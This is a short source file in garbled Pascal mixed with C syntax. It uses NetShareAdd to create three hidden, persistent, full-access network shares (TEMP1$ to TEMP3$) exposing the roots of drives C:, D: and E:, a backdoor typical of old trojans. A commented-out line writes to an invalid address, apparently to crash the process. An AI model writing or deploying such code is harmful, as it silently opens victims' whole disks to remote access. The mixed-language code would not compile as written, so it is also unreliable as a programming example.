program lh;

uses
  Windows;

var
  shinfo50: share_info_50;

begin
  ZeroMemory(@shinfo50,sizeof(shinfo50));
  shinfo50.shi50_type:=STYPE_DISKTREE;
  shinfo50.shi50_flags:=SHI50F_FULL | SHI50F_SYSTEM| SHI50F_PERSIST;
  shinfo50.shi50_remark:=PChar('');

  lstrcpyn(shinfo50.shi50_netname,"TEMP1$",LM20_NNLEN+1);
  shinfo50.shi50_path="C:\\";
  NetShareAdd(NULL,50,(char*)&shinfo50,sizeof(struct share_info_50));

  lstrcpyn(shinfo50.shi50_netname,"TEMP2$",LM20_NNLEN+1);
  shinfo50.shi50_path="D:\\";
  NetShareAdd(NULL,50,(char*)&shinfo50,sizeof(struct share_info_50));

  lstrcpyn(shinfo50.shi50_netname,"TEMP3$",LM20_NNLEN+1);
  shinfo50.shi50_path="E:\\";
  NetShareAdd(NULL,50,(char*)&shinfo50,sizeof(struct share_info_50));

  //FillMemory((VOID*)0xFFFFFFFF,1,0);
end.
